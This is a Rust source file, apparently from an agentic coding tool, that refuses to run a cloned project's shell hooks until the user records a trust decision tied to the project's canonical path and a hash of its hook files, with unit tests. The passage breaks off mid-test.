//! Per-project trust: one recorded decision about whether Wizard may execute
//! what a project ships.
//!
//! Cloning a repository must not be enough to run its code. A project may
//! carry `<project>/.wizard/hooks.toml`, whose entries Wizard runs through
//! `sh -c` at fixed lifecycle points, and `session_start` fires on every
//! surface (TUI, sovereign, gateway, GUI, fleet) before the model has said a
//! word. Ungated, `git clone` plus `wizard` is arbitrary code execution with
//! the user's privileges.
//!
//! The gate is a single decision per project, recorded in
//! `~/.wizard/trusted_projects` (one JSON object per line) and keyed on two
//! things: the *canonicalised* project root, so a symlink or a `..`-dressed
//! path cannot ride another project's approval, and a hash of the project's
//! executable surface, so editing, replacing, or newly adding the hooks file
//! re-opens the question instead of inheriting the old yes.
//!
//! The default is no, and the default is also *do not ask*. Asking parks a
//! thread on stdin, which is only safe when the caller knows that nothing else
//! is reading the terminal, so that knowledge is a capability the caller
//! declares ([`Console`]) and never something this module infers from
//! `isatty`. Every path that declares nothing (sovereign runs, the gateway,
//! the GUI server, CI, and every mid-session agent rebuild underneath the TUI)
//! gets "untrusted" and refuses out loud; nothing is recorded, so the next
//! interactive run in that directory still gets to decide. [`TRUST_ENV`] is the
//! deliberate opt-in for unattended machines whose project hooks are the
//! operator's own; it answers open questions only and never overrules a
//! refusal the user recorded.
//!
//! Only project-supplied files go through the gate. The global
//! `~/.wizard/hooks.toml` is the user's own by construction; gating it would
//! prompt in every directory on earth and would close no hole.

use std::io::{IsTerminal, Write};
use std::path::{Path, PathBuf};
use std::sync::{Mutex, PoisonError};

use anyhow::{Context, Result, anyhow};
use serde::{Deserialize, Serialize};

use crate::config::Config;
use crate::platform::{lockfile, process, secrets};

/// Project-relative path of the file through which a project hands Wizard
/// shell commands. Named rather than inlined because [`crate::hooks`] has to
/// pick its own file out of an approved [`Surface`], which may grow other
/// members.
pub const PROJECT_HOOKS_FILE: &str = ".wizard/hooks.toml";

/// Project-relative paths whose presence hands Wizard code to execute. Their
/// contents feed the fingerprint, so a change to any of them re-opens the
/// trust question. Grow this list whenever a new project file becomes
/// executable.
const EXECUTABLE_SURFACE: [&str; 1] = [PROJECT_HOOKS_FILE];

/// Environment opt-in for unattended runs: `WIZARD_TRUST_PROJECT=1` (also
/// `true` / `yes`) trusts projects that have no decision on record, for this
/// process only. It is never persisted, so it cannot leak a decision into
/// later interactive runs, and it cannot overrule a recorded refusal.
pub const TRUST_ENV: &str = "WIZARD_TRUST_PROJECT";

/// How long [`lock_store`] waits for another process to finish its write
/// before giving up and writing anyway. A wedged wizard elsewhere on the
/// machine must not stop this one from starting; the window it reopens is the
/// one that existed before the lock.
const LOCK_TIMEOUT: std::time::Duration = std::time::Duration::from_millis(500);

/// Serialises the question and the write that follows it. Two sessions in one
/// process (GUI tasks, fleet workers) must not interleave prompts on one
/// terminal; whoever loses the race re-reads the store under the lock and
/// finds the answer already there. Across processes the store is guarded by
/// [`lock_store`] instead.
static STORE: Mutex<()> = Mutex::new(());

/// What the store says about a project right now.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Status {
    /// The user approved this project with exactly this executable surface.
    Trusted,
    /// The user refused this project with exactly this executable surface.
    Denied,
    /// Nothing on record for this root, or the recorded fingerprint no longer
    /// matches what is on disk, so the question is open again.
    Unknown,
}

/// The answer being recorded.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    Trust,
    Deny,
}

/// Whether the caller owns the terminal well enough to put a *blocking*
/// question on it. Declared by the caller; never inferred here.
///
/// Probing the terminal answers "is there a tty on fd 0", which is not the
/// question. Under the TUI the answer is yes and prompting is still
/// catastrophic: crossterm holds that same fd in raw mode behind the alternate
/// screen, so the question is painted invisibly over the frame, the keystroke
/// that would answer it is taken by the event stream, and the blocking
/// `read_line` parks the very thread running the event loop until the process
/// is killed. A foreground `wizard gui` passes the same probe and would block a
/// browser-driven task on a prompt nobody is looking at, holding [`STORE`] and
/// a tokio worker while it waits.
///
/// So the default is [`Console::Unavailable`]: a caller that has not thought
/// about it refuses instead of blocking. [`Console::Owned`] is a promise about
/// the whole process for the duration of the call, not just about this thread.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum Console {
    /// Nobody has said a blocking terminal question is safe here.
    #[default]
    Unavailable,
    /// The caller owns the terminal: no raw mode, no alternate screen, no
    /// other reader on stdin, and blocking this thread is acceptable.
    Owned,
}

/// Verdict of [`gate`]: may Wizard execute what this project ships, and if
/// not, what to tell the user.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Gate {
    /// The project's files may run, and these are the exact bytes that were
    /// approved. The caller executes *these*, never a fresh read (see
    /// [`Surface`]).
    Allowed(Surface),
    /// Refused, with a one-line reason meant for the user (not the model).
    Refused(String),
}

/// One file of a project's executable surface, read once.
#[derive(Clone, PartialEq, Eq)]
struct SurfaceFile {
    /// Project-relative path, exactly as it appears in [`EXECUTABLE_SURFACE`].
    /// Part of the fingerprint, and how a caller asks for its file back.
    rel: &'static str,
    /// Where it was read from, for the message that names it to the user.
    path: PathBuf,
    /// The bytes as of that read.
    contents: Vec<u8>,
}

/// A project's executable surface, pinned: every [`EXECUTABLE_SURFACE`] file
/// that could be read, with its contents, taken in a single pass.
///
/// The pinning is the point. The bytes the user is asked about, the bytes the
/// recorded fingerprint covers, and the bytes that actually run used to be
/// three separate reads of the same path. Wizard is an agentic coding tool
/// that writes into the project it is working on, so "the file changed between
/// two of those reads" is an ordinary Tuesday: a `git pull` (or Wizard's own
/// edit) landing while the user reads the file in another pane ends with the
/// *new* content approved, permanently, and never asked about. One read,
/// carried through the decision and handed to the caller, closes that.
#[derive(Clone, Default, PartialEq, Eq)]
pub struct Surface {
    files: Vec<SurfaceFile>,
}

/// Names and sizes only. A surface file's contents are whatever the repository
/// author wrote, and a debug print of them would put attacker-chosen bytes
/// (escape sequences included) into a log or a panic message, which is the
/// same reason [`prompt_on_terminal`] names the files instead of quoting them.
impl std::fmt::Debug for Surface {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_list()
            .entries(
                self.files
                    .iter()
                    .map(|file| format!("{} ({} bytes)", file.path.display(), file.contents.len())),
            )
            .finish()
    }
}

impl Surface {
    /// Read every [`EXECUTABLE_SURFACE`] file present under `root`.
    ///
    /// A path that exists but cannot be read (a directory in its place, a
    /// dangling symlink, no permission) is left out entirely. That is safe in
    /// the direction that matters: a hook Wizard cannot read is a hook Wizard
    /// cannot run, so there is nothing to gate and nothing to ask about.
    fn read(root: &Path) -> Self {
        let files = EXECUTABLE_SURFACE
            .iter()
            .filter_map(|rel| {
                let path = root.join(rel);
                let contents = std::fs::read(&path).ok()?;
                Some(SurfaceFile {
                    rel,
                    path,
                    contents,
                })
            })
            .collect();
        Self { files }
    }

    /// True when the project ships nothing Wizard would execute. The common
    /// case, and the one that must stay silent.
    pub fn is_empty(&self) -> bool {
        self.files.is_empty()
    }

    /// The pinned bytes of one surface member, by its [`EXECUTABLE_SURFACE`]
    /// path. `None` when the project does not ship it.
    pub fn contents_of(&self, rel: &str) -> Option<&[u8]> {
        self.files
            .iter()
            .find(|file| file.rel == rel)
            .map(|file| file.contents.as_slice())
    }

    /// sha256 over the surface: each present file's relative path, its length,
    /// and its bytes. Path and length are in the digest so that moving content
    /// between surface files, or splitting it across them, cannot collide with
    /// an already-approved fingerprint.
    fn fingerprint(&self) -> String {
        let mut buf: Vec<u8> = Vec::new();
        for file in &self.files {
            buf.extend_from_slice(file.rel.as_bytes());
            buf.extend_from_slice(format!("\n{}\n", file.contents.len()).as_bytes());
            buf.extend_from_slice(&file.contents);
        }
        crate::update::sha256_hex(&buf)
    }

    /// Comma-separated paths, for a one-line message.
    fn list(&self) -> String {
        self.files
            .iter()
            .map(|file| file.path.display().to_string())
            .collect::<Vec<_>>()
            .join(", ")
    }
}

/// One line of `~/.wizard/trusted_projects`.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct Entry {
    /// Canonicalised project root.
    root: String,
    /// Hash of the executable surface at the moment the decision was made.
    fingerprint: String,
    /// The decision itself.
    trusted: bool,
    /// RFC 3339 timestamp, for a human reading the file later.
    #[serde(default)]
    recorded_at: String,
}

/// `~/.wizard/trusted_projects`, the decision store.
pub fn store_path() -> Result<PathBuf> {
    Ok(Config::wizard_dir()?.join("trusted_projects"))
}

/// The recorded status of `project_root`.
///
/// A decision only covers the exact surface it was made about: a hooks file
/// edited, replaced, or newly added since then reads back as
/// [`Status::Unknown`], which is what makes the question re-open rather than
/// ride the old answer.
pub fn status(project_root: &Path) -> Status {
    let Ok(store) = store_path() else {
        return Status::Unknown;
    };
    status_in(&store, project_root)
}

/// Testable core of [`status`]: the same lookup against an explicit store, so
/// a test can plant hostile lines without touching the store the rest of the
/// suite is recording into.
fn status_in(store: &Path, project_root: &Path) -> Status {
    let Some(root) = canonical_root(project_root) else {
        return Status::Unknown;
    };
    status_of(store, &root, &Surface::read(&root).fingerprint())
}

/// [`status_in`] for a caller that has already canonicalised the root and
/// pinned the surface, so the answer is about the bytes that caller holds and
/// not about a second read that may have landed on a different file.
fn status_of(store: &Path, root: &Path, fingerprint: &str) -> Status {
    match last_entry(store, root) {
        Some(entry) if entry.fingerprint == fingerprint => {
            if entry.trusted {
                Status::Trusted
            } else {
                Status::Denied
            }
        }
        _ => Status::Unknown,
    }
}

/// The newest decision recorded for `root`, whatever surface it was about.
/// Last matching line wins, so a hand-edited store with duplicates still
/// behaves like the newest decision.
fn last_entry(store: &Path, root: &Path) -> Option<Entry> {
    load_entries(store)
        .into_iter()
        .rev()
        .find(|entry| Path::new(&entry.root) == root)
}

/// Whether the newest decision on record for `root` is a refusal, *ignoring*
/// the fingerprint.
///
/// [`Status::Denied`] is deliberately narrow: it only covers the surface the
/// user actually said no to, so an edited hooks file re-opens the question
/// rather than staying refused forever. That is right when there is somebody
/// to re-ask, and wrong for [`TRUST_ENV`], which answers open questions with
/// no human involved: the file that re-opened the question is the repository
/// author's own file, so "append a blank line and push" would otherwise be a
/// way around a refusal on every machine that exports the variable.
fn refused_before(store: &Path, root: &Path) -> bool {
    last_entry(store, root).is_some_and(|entry| !entry.trusted)
}

/// Record `decision` for `project_root`, replacing any previous decision for
/// the same root. The fingerprint is taken from the surface as it is right
/// now, which is the surface the user was shown.
pub fn record(project_root: &Path, decision: Decision) -> Result<()> {
    record_at(&store_path()?, project_root, decision)
}

/// Testable core of [`record`]: takes [`STORE`] and writes to an explicit
/// store path.
fn record_at(store: &Path, project_root: &Path, decision: Decision) -> Result<()> {
    let _guard = STORE.lock().unwrap_or_else(PoisonError::into_inner);
    let fingerprint = Surface::read(project_root).fingerprint();
    record_in(store, project_root, decision, &fingerprint)
}

/// [`record_at`] without taking [`STORE`]; the caller must already hold it.
///
/// `fingerprint` is passed in rather than computed here so that what gets
/// written is the surface the decision was *about*: [`gate_with`] reads the
/// files once, shows the user those, and records the digest of those.
fn record_in(
    store: &Path,
    project_root: &Path,
    decision: Decision,
    fingerprint: &str,
) -> Result<()> {
    let root = canonical_root(project_root).ok_or_else(|| {
        anyhow!(
            "cannot record a trust decision for {}: the path does not resolve",
            project_root.display()
        )
    })?;
    // A non-UTF-8 root would round-trip lossily through JSON and never match
    // itself again, which would silently re-prompt forever. Say so instead.
    let key = root
        .to_str()
        .ok_or_else(|| anyhow!("project root {} is not valid UTF-8", root.display()))?;
    let dir = store
        .parent()
        .ok_or_else(|| anyhow!("trust store {} has no parent directory", store.display()))?;
    std::fs::create_dir_all(dir).with_context(|| format!("creating {}", dir.display()))?;

    // Read and write under one cross-process lock: the whole point is that the
    // entries this rewrite drops are the ones it just read, not the ones some
    // other wizard added in between.
    let _lock = lock_store(dir);
    let mut entries = load_entries(store);
    // One entry per project: a new decision replaces the old one rather than
    // stacking up behind it.
    entries.retain(|entry| Path::new(&entry.root) != root);
    entries.push(Entry {
        root: key.to_string(),
        fingerprint: fingerprint.to_string(),
        trusted: matches!(decision, Decision::Trust),
        recorded_at: chrono::Utc::now().to_rfc3339_opts(chrono::SecondsFormat::Secs, true),
    });
    write_entries(store, &entries)
}

/// The enforcement entry point: may Wizard run what `project_root` ships?
///
/// Never asks and never blocks. An undecided project is refused, which is the
/// right answer for every caller that has not declared a console: the gate is
/// reached from `hooks::load`, and that runs again on every mid-session agent
/// rebuild (`/model`, a provider switch, `/fusion`, crash recovery) with the
/// TUI already holding the terminal. Callers that genuinely own the terminal
/// use [`gate_with_console`].
pub fn gate(project_root: &Path) -> Gate {
    gate_with_console(project_root, Console::Unavailable)
}

/// [`gate`], with the caller declaring whether a blocking question may be put
/// on the terminal right now. See [`Console`]: `Console::Owned` is a promise
/// about the whole process, and it is still only a permission, not an
/// instruction. The question is asked only when the terminal facts agree with
/// the declaration, and only when there is something to ask about.
pub fn gate_with_console(project_root: &Path, console: Console) -> Gate {
    gate_with_console_env(project_root, console, env_trust())
}

/// [`gate_with_console`] with [`TRUST_ENV`] resolved by the caller.
///
/// The public entry points read the process environment through
/// [`env_trust`]; every test drives this instead, because `cargo test`
/// inherits whatever the developer or the CI runner exported (`docs/hooks.md`
/// recommends exporting it on unattended machines) and a security test whose
/// verdict flips with the shell it was started from is not a test.
pub(crate) fn gate_with_console_env(
    project_root: &Path,
    console: Console,
    env_trusted: bool,
) -> Gate {
    let store = match store_path() {
        Ok(store) => store,
        Err(err) => {
            // Nowhere to keep an answer is nowhere to ask a question from:
            // prompting once per run would train the user to say yes. A
            // project with nothing executable is unaffected, so this only ever
            // bites a project that ships hooks on a machine with no `~`.
            tracing::warn!("could not resolve the trust store: {err}");
            let surface = Surface::read(project_root);
            if surface.is_empty() {
                return Gate::Allowed(surface);
            }
            return Gate::Refused(refusal_no_store(project_root));
        }
    };
    let prompt: Ask<'_> = &prompt_on_terminal;
    let ask = can_ask(console).then_some(prompt);
    gate_with(&store, project_root, ask, env_trusted)
}

/// The refusal a surface with no console is going to get, or `None` when the
/// project's hooks may run.
///
/// [`gate`] is the enforcement point and runs inside `crate::hooks::load`
/// regardless; this is for the surfaces that can never ask (the messaging
/// gateway, the GUI server) and want to say so once, where their operator or
/// their user can see it, instead of letting a project's hooks vanish with
/// nothing but a line in `~/.wizard/logs`. It asks nothing, blocks on nothing,
/// and records nothing.
pub fn unattended_refusal(project_root: &Path) -> Option<String> {
    match gate(project_root) {
        Gate::Allowed(_) => None,
        Gate::Refused(why) => Some(why),
    }
}

/// Settle the trust question for `project_root` on the terminal, before any
/// surface has taken the terminal over.
///
/// This is the one call in Wizard that may block on stdin, and it exists so
/// that the question is asked where the answer can be read and typed: in
/// `main`, after the arguments are parsed and *before* `setup_terminal`, the
/// GUI server, the gateway or an ACP session starts. Call it from anywhere
/// else and it freezes whatever owns the terminal.
///
/// `Some(reason)` is the refusal, for the caller to print; stderr is safe
/// here, and only here. `None` means the project's hooks may run. Either way
/// the answer is on record, so the [`gate`] calls that every later
/// `hooks::load` makes (agent rebuilds included) find it and ask nothing.
pub fn preflight(project_root: &Path) -> Option<String> {
    match gate_with_console(project_root, Console::Owned) {
        Gate::Allowed(_) => None,
        Gate::Refused(why) => Some(why),
    }
}

/// Whether a blocking question can be put to a human right now: the caller has
/// declared the console theirs *and* the terminal facts agree.
///
/// The declaration is necessary, not sufficient. `echo hi | wizard` owns its
/// terminal in the sense the caller means but has a pipe on fd 0, and a
/// process that has been backgrounded earns a SIGTTIN for reading fd 0 and
/// stops instead of asking anybody anything.
fn can_ask(console: Console) -> bool {
    if console == Console::Unavailable {
        // No claim, no question, and no reason to spend the syscalls looking
        // at a terminal we are not allowed to use. This is the path every
        // agent rebuild takes.
        return false;
    }
    can_ask_with(console, Tty::probe())
}

/// What this process can observe about its terminal, taken once and passed in
/// so the rule in [`can_ask_with`] is testable without a tty.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Tty {
    /// fd 0 is a terminal.
    stdin: bool,
    /// fd 1 is a terminal.
    stdout: bool,
    /// This process owns that terminal's foreground process group.
    foreground: bool,
}

impl Tty {
    fn probe() -> Self {
        Self {
            stdin: std::io::stdin().is_terminal(),
            stdout: std::io::stdout().is_terminal(),
            foreground: process::in_foreground(),
        }
    }
}

/// The rule itself: a declaration plus a real, owned terminal on both ends.
fn can_ask_with(console: Console, tty: Tty) -> bool {
    matches!(console, Console::Owned) && tty.stdin && tty.stdout && tty.foreground
}

/// How the question gets put to a human: given the canonical project root and
/// the pinned surface, answer yes or no. Injected rather than called directly
/// so the decision path is testable without a terminal.
type Ask<'a> = &'a dyn Fn(&Path, &Surface) -> bool;

/// Testable core of [`gate`]. `ask` is the way to put the question to a
/// human, or `None` when there is nobody to ask; `env_trusted` is [`TRUST_ENV`]
/// resolved by the caller so the decision does not depend on process
/// environment a test would have to mutate.
fn gate_with(store: &Path, project_root: &Path, ask: Option<Ask<'_>>, env_trusted: bool) -> Gate {
    // One read of the project's executable surface for the whole decision: it
    // is what the user is shown, what the fingerprint covers, and what the
    // caller executes (see [`Surface`]).
    let surface = Surface::read(project_root);
    if surface.is_empty() {
        // Nothing executable to gate, so nothing to ask about. This is the
        // common case and it must stay silent.
        return Gate::Allowed(surface);
    }
    let shown = canonical_root(project_root).unwrap_or_else(|| project_root.to_path_buf());
    let fingerprint = surface.fingerprint();

    let _guard = STORE.lock().unwrap_or_else(PoisonError::into_inner);
    match status_of(store, &shown, &fingerprint) {
        Status::Trusted => Gate::Allowed(surface),
        // A recorded no outranks the environment. `WIZARD_TRUST_PROJECT` lives
        // in a `~/.bashrc` or a CI env block once it is set anywhere, and the
        // user who answered "n" here did not mean "unless something exports a
        // variable".
        Status::Denied => Gate::Refused(refusal_denied(&shown, &surface)),
        Status::Unknown => {
            // A refusal that this edit re-opened is still a refusal as far as
            // the environment opt-in is concerned; see [`refused_before`].
            let reopened_refusal = refused_before(store, &shown);
            if env_trusted && !reopened_refusal {
                // The opt-in answers open questions only, and answers them for
                // this process alone: nothing is recorded, so an interactive
                // run in the same directory still gets to decide.
                return Gate::Allowed(surface);
            }
            let Some(ask) = ask else {
                // Nothing is recorded here on purpose: a headless run must
                // not decide on behalf of the next interactive one.
                return Gate::Refused(if reopened_refusal {
                    refusal_changed_after_refusal(&shown, &surface)
                } else {
                    refusal_unattended(&shown, &surface)
                });
            };
            let trusted = ask(&shown, &surface);
            let decision = if trusted {
                Decision::Trust
            } else {
                Decision::Deny
            };
            if let Err(err) = record_in(store, project_root, decision, &fingerprint) {
                // The answer still holds for this run; only the memory of it
                // is lost, so the next run asks again.
                tracing::warn!("could not record the trust decision: {err}");
            }
            if trusted {
                Gate::Allowed(surface)
            } else {
                Gate::Refused(refusal_denied(&shown, &surface))
            }
        }
    }
}

/// The project root with symlinks resolved and `..` collapsed. `None` when it
/// does not resolve: a root we cannot name is a root we cannot key a decision
/// on, and every caller treats that as untrusted.
fn canonical_root(root: &Path) -> Option<PathBuf> {
    match std::fs::canonicalize(root) {
        Ok(path) => Some(path),
        Err(err) => {
            tracing::warn!(
                "could not canonicalise project root {}: {err}",
                root.display()
            );
            None
        }
    }
}

/// Read the store. A missing file means no decisions; an unparseable line is
/// skipped with a warning, so a corrupt store degrades to "ask again" rather
/// than to "trust everything".
fn load_entries(path: &Path) -> Vec<Entry> {
    let raw = match std::fs::read_to_string(path) {
        Ok(raw) => raw,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Vec::new(),
        Err(err) => {
            tracing::warn!("could not read {}: {err}", path.display());
            return Vec::new();
        }
    };
    raw.lines()
        .filter(|line| !line.trim().is_empty())
        .filter_map(|line| match serde_json::from_str::<Entry>(line) {
            Ok(entry) => Some(entry),
            Err(err) => {
                tracing::warn!("skipping unreadable line in {}: {err}", path.display());
                None
            }
        })
        .collect()
}

/// Sidecar file the store's cross-process lock is taken on.
///
/// Deliberately not the store itself: the store is replaced by `rename`, and a
/// lock held on the replaced inode guards nothing, because the next process
/// opens the new inode and finds it unlocked.
fn lock_path(dir: &Path) -> PathBuf {
    dir.join(".trusted_projects.lock")
}

/// Take the cross-process lock over the store, or give up after
/// [`LOCK_TIMEOUT`] and let the caller write anyway.
///
/// [`STORE`] serialises the threads of one process and nothing serialises two
/// wizards: both read the store whole, both write it whole, and the second
/// rename drops the first one's line, so a user who answered yes in one
/// terminal is asked again with no explanation.
///
/// `None` (the lock is held elsewhere, or this platform has none yet) means
/// write anyway: better a rare lost line than a wizard that will not start
/// because something else on the machine is wedged holding a lock. Dropping
/// the returned guard releases the lock, including on panic and on process
/// death; see [`lockfile`] for why that needs no cleanup.
fn lock_store(dir: &Path) -> Option<lockfile::Guard> {
    lockfile::exclusive(&lock_path(dir), LOCK_TIMEOUT)
}

/// Write the store atomically and owner-only, mirroring
/// `credentials::write_at`: this file decides what may execute, so a partial
/// write must never be observable and other users must not be able to add
/// themselves a line. The rename also means a store left group-readable by an
/// older wizard is tightened by the next write.
///
/// What "owner-only" means is [`secrets`]' business, not this module's. The
/// parent directory is created with plain [`std::fs::create_dir_all`] rather
/// than through [`secrets::create_private_dir_strict`], deliberately: the tree
/// is already hardened best-effort by [`Config::ensure_dirs`], and a
/// filesystem that cannot express the hardening (exFAT, a CIFS mount, WSL
/// DrvFs, which is where `WIZARD_HOME` gets pointed on exactly the machines
/// that need it) must not be a filesystem where a recorded "yes" fails to
/// persist and the user is asked again on every run.
fn write_entries(path: &Path, entries: &[Entry]) -> Result<()> {
    let dir = path
        .parent()
        .ok_or_else(|| anyhow!("trust store {} has no parent directory", path.display()))?;
    std::fs::create_dir_all(dir).with_context(|| format!("creating {}", dir.display()))?;

    let mut raw = String::new();
    for entry in entries {
        raw.push_str(&serde_json::to_string(entry).context("serializing a trust decision")?);
        raw.push('\n');
    }

    let tmp = dir.join(format!(".trusted_projects.{}.tmp", std::process::id()));
    {
        // Pid-tagged, so the only file this can remove is debris a dead
        // process left behind under a pid the kernel has since handed to us.
        // Removing it first is what keeps such debris from wedging every
        // later write, since the create below refuses an existing name: that
        // refusal is deliberate, because it is also what stops a scratch name
        // someone else planted here from redirecting the write.
        let _ = std::fs::remove_file(&tmp);
        let mut file = secrets::create_private_file(&tmp)?;
        file.write_all(raw.as_bytes())
            .with_context(|| format!("writing {}", tmp.display()))?;
        file.sync_all()
            .with_context(|| format!("syncing {}", tmp.display()))?;
    }
    std::fs::rename(&tmp, path).with_context(|| format!("moving {} into place", path.display()))?;
    Ok(())
}

/// Whether [`TRUST_ENV`] is set to an affirmative value. The one place the
/// process environment is read; everything below it takes the answer as an
/// argument.
pub(crate) fn env_trust() -> bool {
    trust_value(std::env::var(TRUST_ENV).ok().as_deref())
}

/// Testable core of [`env_trust`]: `raw` is the [`TRUST_ENV`] value, if any.
/// Only an explicit affirmative counts, so `WIZARD_TRUST_PROJECT=0` (or a typo)
/// leaves the gate exactly where it was.
fn trust_value(raw: Option<&str>) -> bool {
    raw.map(|raw| {
        matches!(
            raw.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes"
        )
    })
    .unwrap_or(false)
}

/// Put the question to the user. Anything but an explicit yes is a no,
/// including end of input.
///
/// Reachable only through [`gate_with_console`] with [`Console::Owned`]: it
/// prints with `println!` and blocks in `read_line`, both of which are wrong
/// anywhere the terminal belongs to something else.
///
/// The surface files are named, never quoted: their contents are whatever the
/// repository author wrote, and echoing that to a terminal hands an attacker
/// escape sequences. The user reads the files themselves.
fn prompt_on_terminal(root: &Path, surface: &Surface) -> bool {
    println!();
    println!("This project ships files that Wizard would run as shell commands:");
    for file in &surface.files {
        println!("  {}", file.path.display());
    }
    println!();
    println!(
        "There is no trust decision on record for {}.",
        root.display()
    );
    println!("Read those files first: a hook runs unsandboxed, with your privileges.");
    print!("Trust this project and run its hooks? [y/N] ");
    if std::io::stdout().flush().is_err() {
        return false;
    }
    let mut line = String::new();
    if std::io::stdin().read_line(&mut line).is_err() {
        return false;
    }
    matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes")
}

/// Refusal text once the user has said no (now or earlier). It names the
/// environment opt-in only to say that it does not apply here, so nobody goes
/// looking for it as a way around their own answer.
fn refusal_denied(root: &Path, surface: &Surface) -> String {
    format!(
        "not running project hooks ({}): {} is not a trusted project. \
         Remove its line from {} to be asked again; {TRUST_ENV} does not \
         override a refusal you recorded.",
        surface.list(),
        root.display(),
        store_display()
    )
}

/// Refusal text when there was nobody to ask.
fn refusal_unattended(root: &Path, surface: &Surface) -> String {
    format!(
        "not running project hooks ({}): {} has no trust decision on record and \
         there is no terminal to ask on. Start wizard once interactively in that \
         directory to decide, or set {TRUST_ENV}=1 for unattended runs.",
        surface.list(),
        root.display()
    )
}

/// Refusal text for the case the environment opt-in must not cover: the user
/// refused this project, and the refusal was re-opened by an edit to the very
/// files it was about. There is nobody to re-ask, so the answer stands.
fn refusal_changed_after_refusal(root: &Path, surface: &Surface) -> String {
    format!(
        "not running project hooks ({}): you refused {} and its hooks have \
         changed since, so the question is open again and there is no terminal \
         to ask on. {TRUST_ENV} does not lift a refusal you recorded, not even \
         for a rewritten file. Start wizard once interactively in that \
         directory to decide again.",
        surface.list(),
        root.display()
    )
}

/// Refusal text when `~/.wizard` itself does not resolve, so no decision can
/// be read or written.
fn refusal_no_store(root: &Path) -> String {
    format!(
        "not running project hooks: {} could not be checked because ~/.wizard \
         does not resolve, so no trust decision can be read or recorded.",
        root.display()
    )
}

/// The store path for a message, with a readable fallback when `~/.wizard`
/// itself cannot be resolved.
fn store_display() -> String {
    store_path()
        .map(|path| path.display().to_string())
        .unwrap_or_else(|_| "~/.wizard/trusted_projects".to_string())
}

/// Answer the trust question for `project_root` as if a human had typed
/// `answer` at the prompt, against the real store.
///
/// The whole decision path runs: the surface is read and pinned, the answer is
/// recorded through [`record_in`] into the store `status` and `gate` read back,
/// and the same [`Gate`] comes out. Only the human is scripted, through the
/// [`Ask`] seam that exists for exactly this reason. It is the only way to get
/// an *approved* project in a test, because no test may drive a
/// [`Console::Owned`] path into [`prompt_on_terminal`]: under
/// `cargo test -- --nocapture` stdin is the developer's own terminal and the
/// suite would sit there waiting for a keystroke.
#[cfg(test)]
pub(crate) fn answer_for_test(project_root: &Path, answer: bool) -> Gate {
    let store = store_path().expect("the test store resolves");
    let ask = move |_: &Path, _: &Surface| answer;
    gate_with(&store, project_root, Some(&ask), false)
}

#[cfg(test)]
mod tests {
    use std::cell::Cell;
    use std::sync::Barrier;
    use std::sync::atomic::{AtomicUsize, Ordering};

    use super::*;
    use crate::platform::paths;

    /// Temp directory tree removed on drop.
    struct TempDir(PathBuf);

    impl TempDir {
        fn new() -> Self {
            let dir = std::env::temp_dir().join(format!("wizard-trust-{}", uuid::Uuid::new_v4()));
            std::fs::create_dir_all(&dir).expect("create temp dir");
            Self(dir)
        }

        /// A decision store of this test's own, so nothing here depends on
        /// what the rest of the suite is recording in parallel.
        fn store(&self) -> PathBuf {
            self.0.join("trusted_projects")
        }
    }

    impl Drop for TempDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    /// A project root carrying a `.wizard/hooks.toml` with `command`.
    fn project_with_hooks(tmp: &TempDir, command: &str) -> PathBuf {
        project_named(tmp, "proj", command)
    }

    /// [`project_with_hooks`] with the directory name spelled out, for tests
    /// that need two projects side by side.
    fn project_named(tmp: &TempDir, name: &str, command: &str) -> PathBuf {
        let root = tmp.0.join(name);
        let hooks = root.join(".wizard").join("hooks.toml");
        std::fs::create_dir_all(hooks.parent().expect("has parent")).expect("mkdir");
        std::fs::write(
            &hooks,
            format!("[[hooks]]\nevent = \"session_start\"\ncommand = \"{command}\"\n"),
        )
        .expect("write hooks.toml");
        root
    }

    /// An asker that always answers `answer` and counts how often it was
    /// consulted.
    fn counting_ask(answer: bool, calls: &Cell<usize>) -> impl Fn(&Path, &Surface) -> bool {
        move |_root: &Path, _surface: &Surface| {
            calls.set(calls.get() + 1);
            answer
        }
    }

    /// Whether a verdict allows, ignoring the surface it carries.
    fn allowed(gate: &Gate) -> bool {
        matches!(gate, Gate::Allowed(_))
    }

    #[test]
    fn a_project_with_no_executable_surface_is_never_asked_about() {
        let tmp = TempDir::new();
        let root = tmp.0.join("plain");
        std::fs::create_dir_all(&root).expect("mkdir");
        let calls = Cell::new(0);
        let ask = counting_ask(true, &calls);
        assert!(allowed(&gate_with(&tmp.store(), &root, Some(&ask), false)));
        assert_eq!(calls.get(), 0, "nothing executable, nothing to ask");
    }

    #[test]
    fn a_fresh_project_has_no_recorded_status() {
        let tmp = TempDir::new();
        let root = project_with_hooks(&tmp, "true");
        assert_eq!(status_in(&tmp.store(), &root), Status::Unknown);
    }

    #[test]
    fn recording_trust_is_read_back() {
        let tmp = TempDir::new();
        let store = tmp.store();
        let root = project_with_hooks(&tmp, "true");
        record_at(&store, &root, Decision::Trust).expect("record");
        assert_eq!(status_in(&store, &root), Status::Trusted);
        record_at(&store, &root, Decision::Deny).expect("record");
        assert_eq!(
            status_in(&store, &root),
            Status::Denied,
            "the newest answer wins"
        );
    }

    #[test]
    fn the_public_entry_points_reach_the_real_store() {
        // `record`/`status` resolve `~/.wizard` themselves (a per-process temp
        // directory under cfg(test)); every other test here drives an explicit
        // store, so this is what proves the resolved path is wired up at all.
        let tmp = TempDir::new();
        let root = project_with_hooks(&tmp, "true");
        assert_eq!(status(&root), Status::Unknown);
        record(&root, Decision::Trust).expect("record");
        assert_eq!(status(&root), Status::Trusted);
        assert!(allowed(&gate(&root)));
    }

    #[test]
    fn the_public_gate_never_prompts_without_a_console_declaration() {
        // The freeze this guards against: `hooks::load` -> `gate` runs again on
        // every mid-session agent rebuild (`/model`, provider switch,
        // `/fusion`, crash recovery) while the TUI holds the terminal in raw
        // mode. `gate` must refuse there instead of blocking on stdin, and it
        // must not record that refusal as the user's answer either.
        //
        // The opt-in is pinned rather than inherited: `cargo test` runs with
